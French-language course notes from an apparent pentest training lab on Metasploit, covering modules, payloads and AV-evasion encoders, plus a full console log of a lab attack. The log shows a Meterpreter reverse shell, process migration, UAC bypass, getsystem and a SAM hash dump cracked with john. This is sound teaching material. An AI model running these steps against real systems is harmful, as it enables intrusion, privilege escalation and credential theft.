# Metasploit

- Deploit, periste et nettoie les traces.
- Developper en Ruby
- Manger le livre => Metasploit by HD Moore.
- Outil de pentest
- Open-Source en `Ruby`

Anecdote:

En 2003 envoit des requetes `AxA * 20000` sur le reseau sous XP.

Sociéte de conception de `Nexpose` (Rapid7) qui veut racheter le framework.

## Architecture


## Librairies

MFS Core; MSF Base et Rex

## Interfaces

- MsfGui (Win7) - version graphique de Msf [DEPRICATED]

- MsfConsole - Interface de commande. Controleur de charge

- ~~Msfcli~~ => MsfVenom - permet de generer et packer les charges. Createur des charges

- MsfWeb - DEPRICATED

- Metasploit Pro - `Hack as a cli` qui permet de gerer les attaques

- Armitage - Existe depuis `BackTrack 3`, supprimé dans Kali mais toujours opérationnel. Controle graphic des charge/control 

- Colbalt Strike - Version elegante de`Armitage`

- Kage - Other Armitage ou RAT (Remote Administration Threat)

`Kage` `Armiteg` et `Cobalt Strik` exploit`Msfconsole`.

## MsfConsole

> msfconsol

La console est connecter à une DB posgres.
On doit faire un update puis lancer les DB pour avoir une sync des vuln.

### Auxiliary

Modules **autre** que ceux de l'attaque. Post exploitation.

Ex: scanner`UDP_sweep` 

- Enumeration
- Sniffing
- Fuzzing => stress d'application avec des parametres pour essayer de genere un autre comportement. Un crash ne signifit pas la prise ou l'elevation de privilège.

Example d'application : `Winaf`

### post

Permet la post-exploitation: persistances, pivoting, utilise les auxiliary module....

### Exploit

Codes qui va exploiter des vuln. Ils sont packagés dés qu'ils sont connus. Reproduit une vuln.

**ATTENTION** Un exploit n'est pas une prise de controle. On peut utiliser un exploit pour lancer un Ransomware, un DDOS....

    Un exploit est un bout de code qui exploite une faille => automatise la reproduction d'une vuln.

### payload

Avec un exploit, ne permet pas le controle. C'est la charge mailicieuse embarque dans l'exploit pour definit comment communiquer avec l'exploitant, le tunnel.

1. Le payload peut avoir 2 directions:

    1. Hacker vers la cible => BIND payload
    2. Cible vers hacker => REVERSE payload (Protocole HTTP; HTTPS, DNS, Mail...)

2. Les parametres:

    1.[Cible/Host]
    - remotre address => RHOST (ex: 192.168.2.1)
    - remote port => RPORT (ex: Port 21)

    2.[Hacker]
    - Local address => LHOST
    - Local port => LPORT

3. Execution de `shell`

Execution du shell sur le victime => `Meterpreter`

Le canal de communication avec le `Meterprete` fait de l'obfuscation en assembleur.

**WARNING** le Meterpreter est detecté par tous AV/IDS/IPS.

### Encoder

L'obfuscation permet de passer les AV. Cela, MSF fait de l'encodage (chiffrement, XOR....)

1. Quelques examples 

- `Shikata Ga Nai` Best chiffrement

- `NOP` Pas d'opération en assembleur (0x90). Cela permet de créer du vide et de stabiliser une charge. Connu sous le nom de traineau de vide.

### Evasion

Nouveau module permettant de faire des exploit d'evaion???

## TP 1 - Vuln.

### Init

```shell
$ sudo -s
$ service postgresql start                        
$ service postgresql status
● postgresql.service - PostgreSQL RDBMS
     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)
     Active: active (exited) since Thu 2022-06-23 11:16:39 CEST; 19s ago
    Process: 741661 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
   Main PID: 741661 (code=exited, status=0/SUCCESS)
        CPU: 4ms

juin 23 11:16:39 Ptes systemd[1]: Starting PostgreSQL RDBMS...
juin 23 11:16:39 Ptes systemd[1]: Finished PostgreSQL RDBMS.
$ msfdb init
$ msfconsole

msf6 > 
```

-  Command `show`
`
> show encoders

> show evasion

- Commande disponible
> ?

### search

Permet de chercher des exploits, payloads par rapport aux vuln ou autre.

```bash
$ search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor
```

La doc annonce:
- `info exploit/unix/ftp/vsftpd_234_backdoor` pour information
- `use exploit/unix/ftp/vsftpd_234_backdoor` pour activer l\'utilisation

`OSVDB` Open-Source VulN DataBase qui est une base de données Open-Source de ExploitDB, pas toujours à jours.

### Exploitation

```bash
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
[*] No payload configured, defaulting to cmd/unix/interact

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/
                                      Using-Metasploit
   RPORT   21               yes       The target port (TCP)


Payload options (cmd/unix/interact):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   0   Automatic
   
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.2.1
RHOSTS => 192.168.2.1
```

`options` permet d'avoir les info.
Les payload sont dependents de l'Exploit.

> set payload cmd/unix/interact

C'est le seul proposé pour cet exploit.

- Execute l'exploit en interfactive => une `session`
> exploit

- Execute en tache de fond
> exploit -j

- list des sessions en cours
> sessions

- list des jobs en cours
> jobs

- Switch session
> sessions sessionID
    
- Quitter Session
> abort sessions
    
### MSFVenom

- Create charge
> mfsvenom -p windows/meterpreter/reverse_tcp -f exe -o mous.exe

- Lancement du listner
> msf6 > use multi/handler
> msf6 expoit(multi/handler) > set LHOST 192.168.2.5
> msf6 expoit(multi/handler) > set LPORT 9090

Lorsque msf est contacté, prendre la session:
> session ID
> ? 

**WARNING**  Evtx Event LOG de clean de log => 104

Il faut toujours detacher le meterpreter de la payload:
> ps <= visualisation des Process "Client-PC/Client"

Deplacement en memoire
> migrate PROCESSID_SAME_RIGHT

**NOTE** `voldiff.py` permet de retrouver par diff le process, pas nativement avec `volatilit`.

- Mettre en pause la session pour revenir sur Metasploit
> bg

- Monter les privilèges sous Windows (UAC)
> search uac
> use exploit/windows/local/bypassuac
> options

**WARNING** `4444` est un port specific à Metasploit
    
- Elevation de privilège (UAC)
> getprivs

- Get system privilege
> getsystem

- Recupere la SAM
> hashdump
   
- Crack password
> john sam.txt --format=nt --show
    
- Comment charger des commandes exploitatble en Meterpreter:
> load MODULE

ex de Mimikatz:
> load kiwi

## Note TP


```shell
┌──(root💀Ptes)-[/home/stage]
└─# msfconsole                                                                                                  1 ⨯
                                                  

      .:okOOOkdc'           'cdkOOOko:.                                                                             
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.                                                                           
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:                                                                          
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'                                                                         
  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo                                                                         
  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx                                                                         
  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl                                                                         
  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.                                                                         
   cOOOOOOO.MMM.OOc.MMMMM'oOO.MMM,OOOOOOOc                                                                          
    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo                                                                           
     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl                                                                            
      ;OOOO'MMM.OOOO.MMM:OOOO.MMM;OOOO;                                                                             
       .dOOo'WM.OOOOocccxOOOO.MX'xOOd.                                                                              
         ,kOl'M.OOOOOOOOOOOOO.M'dOk,                                                                                
           :kk;.OOOOOOOOOOOOO.;Ok:                                                                                  
             ;kOOOOOOOOOOOOOOOk:                                                                                    
               ,xOOOOOOOOOOOx,                                                                                      
                 .lOOOOOOOl.                                                                                        
                    ,dOd,                                                                                           
                      .                                                                                             

       =[ metasploit v6.1.14-dev                          ]
+ -- --=[ 2180 exploits - 1155 auxiliary - 399 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: You can upgrade a shell to a Meterpreter 
session on many platforms using sessions -u 
<session_id>                                                                                                        

msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.2.5      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp_allports 
payload => windows/meterpreter/reverse_tcp_allports
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp_allports):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.2.5      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The starting port number to connect back on


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > exploit -j
msf6 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         meterpreter x86/windows  Client-PC\Client @ CLIENT-PC  192.168.2.5:4444 -> 192.168.2.10:49197  (192.16
                                                                   8.2.10)
                                                                   
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User              Path
 ---   ----  ----               ----  -------  ----              ----
 0     0     [System Process]
 4     0     System
 280   4     smss.exe
 316   832   vmtoolsd.exe
 424   832   svchost.exe
 672   636   csrss.exe
 724   636   wininit.exe
 736   716   csrss.exe
 792   716   winlogon.exe
 808   3144  mmc.exe            x86   1
 832   724   services.exe
 844   724   lsass.exe
 852   724   lsm.exe
 952   832   svchost.exe
 1020  832   vmacthlp.exe
 1064  832   svchost.exe
 1076  3112  iexplore.exe       x86   1        Client-PC\Client  C:\Program Files\Internet Explorer\iexplore.exe
 1120  832   svchost.exe
 1228  832   svchost.exe
 1276  832   svchost.exe
 1412  832   svchost.exe
 1520  832   svchost.exe
 1620  832   spoolsv.exe
 1648  832   svchost.exe
 1764  832   avgwdsvcx.exe
 2028  832   VGAuthService.exe
 2168  792   taskmgr.exe        x86   1        Client-PC\Client  C:\Windows\system32\taskmgr.exe
 2352  952   WmiPrvSE.exe
 2476  832   taskhost.exe       x86   1        Client-PC\Client  C:\Windows\system32\taskhost.exe
 2484  832   dllhost.exe
 2692  832   sppsvc.exe
 2760  1076  iexplore.exe       x86   1        Client-PC\Client  C:\Program Files\Internet Explorer\iexplore.exe
 2868  832   msdtc.exe
 3088  1228  dwm.exe            x86   1        Client-PC\Client  C:\Windows\system32\Dwm.exe
 3112  3080  explorer.exe       x86   1        Client-PC\Client  C:\Windows\Explorer.EXE
 3144  952   dllhost.exe        x86   1
 3228  3112  reverse_all.exe    x86   1        Client-PC\Client  C:\Users\Client\Desktop\reverse_all.exe
 3232  3112  avgui.exe          x86   1        Client-PC\Client  C:\Program Files\AVG\Av\avgui.exe
 3296  3112  jusched.exe        x86   1        Client-PC\Client  C:\Program Files\Java\jre1.6.0\bin\jusched.exe
 3308  3112  vmtoolsd.exe       x86   1        Client-PC\Client  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 3500  3232  ctfmon.exe         x86   1        Client-PC\Client  C:\Windows\system32\ctfmon.exe
 3848  832   SearchIndexer.exe

meterpreter > migrate 3232
[*] Migrating from 3228 to 3232...
[*] Migration completed successfully.

msf6 exploit(multi/handler) > use exploit/windows/local/bypassuac
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/bypassuac) > options

Module options (exploit/windows/local/bypassuac):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   SESSION                     yes       The session to run this module on
   TECHNIQUE  EXE              yes       Technique to use if UAC is turned off (Accepted: PSH, EXE)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.163.140  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86


msf6 exploit(windows/local/bypassuac) > set LHOST 192.168.2.5
LHOST => 192.168.2.5
msf6 exploit(windows/local/bypassuac) > set payload windows/meterpreter/reverse_tcp_allports 
payload => windows/meterpreter/reverse_tcp_allports
msf6 exploit(windows/local/bypassuac) > options
Module options (exploit/windows/local/bypassuac):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   SESSION                     yes       The session to run this module on
   TECHNIQUE  EXE              yes       Technique to use if UAC is turned off (Accepted: PSH, EXE)


Payload options (windows/meterpreter/reverse_tcp_allports):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.2.5      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The starting port number to connect back on


Exploit target:

   Id  Name
   --  ----
   0   Windows x86

msf6 exploit(windows/local/bypassuac) > options

Module options (exploit/windows/local/bypassuac):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   SESSION                     yes       The session to run this module on
   TECHNIQUE  EXE              yes       Technique to use if UAC is turned off (Accepted: PSH, EXE)


Payload options (windows/meterpreter/reverse_tcp_allports):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.2.5      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The starting port number to connect back on


Exploit target:

   Id  Name
   --  ----
   0   Windows x86


msf6 exploit(windows/local/bypassuac) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/bypassuac) > run

[!] SESSION may not be compatible with this module:
[!]  * missing Meterpreter features: stdapi_sys_process_set_term_size
[*] Started reverse TCP handler on 192.168.2.5:4444 
[*] UAC is Enabled, checking level...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[+] Part of Administrators group! Continuing...
[*] Uploaded the agent to the filesystem....
[*] Uploading the bypass UAC executable to the filesystem...
[*] Meterpreter stager executable 73802 bytes long being uploaded..
[*] Sending stage (175174 bytes) to 192.168.2.10
[*] Meterpreter session 2 opened (192.168.2.5:4444 -> 192.168.2.10:49198 ) at 2022-06-23 16:00:14 +0200

meterpreter > bg
[*] Backgrounding session 2...
msf6 exploit(windows/local/bypassuac) > sessions 

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         meterpreter x86/windows  Client-PC\Client @ CLIENT-PC  192.168.2.5:4444 -> 192.168.2.10:49197  (192.16
                                                                   8.2.10)
  2         meterpreter x86/windows  Client-PC\Client @ CLIENT-PC  192.168.2.5:4444 -> 192.168.2.10:49198  (192.16
                                                                   8.2.10)
msf6 exploit(windows/local/bypassuac) > sessions 2
[*] Starting interaction with 2...

meterpreter > getprivs 

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > getsystem 
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > hashdump 
Admin:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
Administrateur:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Client:1000:aad3b435b51404eeaad3b435b51404ee:afc44ee7351d61d00698796da06b1ebf:::
Invit�:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

## Rentrer dans Windows7 sans executer le piège

